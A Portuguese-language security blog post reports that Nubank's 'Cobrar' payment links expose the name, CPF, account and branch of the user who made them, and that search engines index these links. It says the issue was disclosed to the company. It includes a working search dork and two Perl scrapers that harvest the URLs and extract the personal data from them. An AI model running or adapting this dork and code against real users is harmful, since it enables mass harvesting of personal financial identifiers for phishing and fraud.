---
layout: content
title: 'Um pequeno caso de scraping de dados pessoais expostos na web'
description: 'Durante a realização de testes em aplicações mobile, foi identificado um recurso no aplicativo do Nubank que permite a criação e o envio de "links de cobrança" para múltiplos destinatários. Embora essa funcionalidade apresente utilidade prática, sua implementação pode estar suscetível a diversos cenários que demandam análise detalhada. Com o intuito de avaliar possíveis implicações, foram desenvolvidas provas de conceito e compartilhadas com a empresa para revisão do design da funcionalidade. A partir dessa análise, constatou-se a possibilidade de mapear dados pessoais, como CPF, nome completo, número e agência da conta vários clientes.'
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

Tabela de conteúdo:
- [Resumo](#sumario)
- [Descrição](#descrição)
- [Prova de conceito](#prova-de-conceito)
- [Impacto](#impacto)
- [Conclusão](#conclusão)
- [Referências](#referencias)

### Sumário

Durante a realização de testes em aplicações mobile, foi identificado um recurso no aplicativo do Nubank que permite a criação e o envio de "links de cobrança" para múltiplos destinatários. Embora essa funcionalidade apresente utilidade prática, sua implementação pode estar suscetível a diversos cenários que demandam análise detalhada. Com o intuito de avaliar possíveis implicações, foram desenvolvidas provas de conceito e compartilhadas com a empresa para revisão do design da funcionalidade. A partir dessa análise, constatou-se a possibilidade de mapear dados pessoais, como CPF, nome completo, número e agência da conta vários clientes.


**DISCLAIMER**: A empresa responsável foi informada sobre todos os detalhes dessa pesquisa no menor tempo possível e respondeu de maneira ética e transparente, demonstrando atenção e comprometimento com a segurança da funcionalidade. Durante os testes realizados, não houve invasão ou violação de sistemas. Além disso, a empresa implementou algumas medidas corretivas para reduzir potenciais riscos associados ao problema relatado. Recomendações adicionais foram fornecidas para mitigar a vulnerabilidade, porém a empresa optou por não implementá-las integralmente.

---

### Descrição

Dentro do aplicativo do Nubank, existe um recurso denominado "Cobrar". Seu funcionamente consiste em: 1) preencher um valor de sua escolha (se desejar) e 2) clique em confirmar 3) após isso, um QR Code é gerado, e você tem a opção de compartilhá-lo ou enviar a cobrança por meio de outro aplicativo, como o WhatsApp:

![](/images/publications/nubank-scraping/creating-a-link.png)

![](/images/publications/nubank-scraping/whatsapp-shared-link.png)


O conteúdo do QR Code é o mesmo link que pode ser compartilhado por aplicativos de mensangens. Quando o link é aberto no navegador, é obtido o seguinte resultado:

![](/images/publications/nubank-scraping/personal-infos.png)

São expostos, sem qualquer tipo de controle, alguns dados do usuário que gerou o link como: o nome completo, CPF, número da conta bancária e agência. O único requisito para obter essas informações sensíveis[1] é possuir essa URL.

A URL em questão é gerada exclusivamente pelo cliente em seu aplicativo, e também cabe ao cliente definir como e com quem compartilhar cada URL gerada.

Porém, essas URLs são indexadas por motores de busca, sendo possível realizar a utilizar de dorks[2] para identificar mais URLs relacionadas a esse serviço. 

Dork para restringir a busca ao site principal do Nubank, onde as urls contenham o padrão "/pagar/" e os retornos envolvendo o blog sejam excluídos:

```text
site:nubank.com.br inurl:/pagar/ -blog
````

Resultado:

![](/images/publications/nubank-scraping/google-dorks.png)

Além disso, observamos que alguns usuários estavam publicando essas URLs em outros canais, como o Twitter. Um uso comum da funcionalidade seria para receber doações.

![](/images/publications/nubank-scraping/twitter-links.png)

---

### Prova de conceito

Para demonstrar o impacto do abuso dessa funcionalidade, uma prova de conceito foi criada. A primeira parte dessa PoC consiste na construção de um código capaz de usar um motor de busca para coletar o maior número possível de URLs. Foi desenvolvido, então, um scraper[3] utilizando o Bing:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw(url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        $dork = url_escape($dork);

        my %seen  = ();
        my $mech = WWW::Mechanize -> new();

        $mech -> ssl_opts (verify_hostname => 0);

        for my $page (0 .. 10) {
            my $url = "https://wwww.bing.com/search?q=${dork}&first=${page}0";

            $mech -> get($url);

            my @links = $mech -> links();

            foreach my $link (@links) {
                $url = $link -> url();

                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

exit main();
```

Com esse código, foram coletadas 100 URLs válidas - esse valor foi limitado em 100 pois o intuito era apenas uma demonstração, mas poderia ser superior:

![](/images/publications/nubank-scraping/file-with-the-urls.png)

Após a coleta das URLs em um arquivo .txt, foi desenvolvido outro scraper que para extrair os dados da página do Nubank:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

binmode(STDOUT, ":encoding(UTF-8)");

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        my $userAgent = Mojo::UserAgent -> new (
            agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        );
        
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp ($_);
            
            my $request = $userAgent -> get($_) -> result();

            if ($request -> is_success()) {
                my $account = $request -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close ($urls_filehandle);
    }
}

exit main();
```

E então o resultado obtido:

![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

CPF, nome completo, número da conta e agência de 100 pessoas, em apenas alguns minutos e com poucas linhas de código.

---

### Impacto

A possibilidade de um atacante abusar dessa funcionalidade disponível nos sistemas da Nubank é alta devida a sua facildade de exploração. Podendo então expor  diversos usuários, vazando informações sensíveis como ilustrado anteriormente. Além disso, um atacante que tenha essas informações em mãos pode usá-las para desenvolver uma abordagem de engenharia social muito bem direcionada.

---

### Conclusão

Através dessa análise, é possível afirmar que uma agente malicioso poderia implementar diversos scrapers para mapear as URLs de cobrança do Nubank e, posteriormente, coletar as informações pessoais presentes nelas. Este artigo apresentou uma PoC como uma dessas implementações, utilizando um motor de busca, mas ainda há espaço para outros canais, como redes sociais (Twitter, Facebook e outras). Esses canais poderiam ser usados para levar essas pessoas a cenários de exposição ou risco, como se tornarem vítimas de spear phishing/engenharia social.

---

### Referências

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)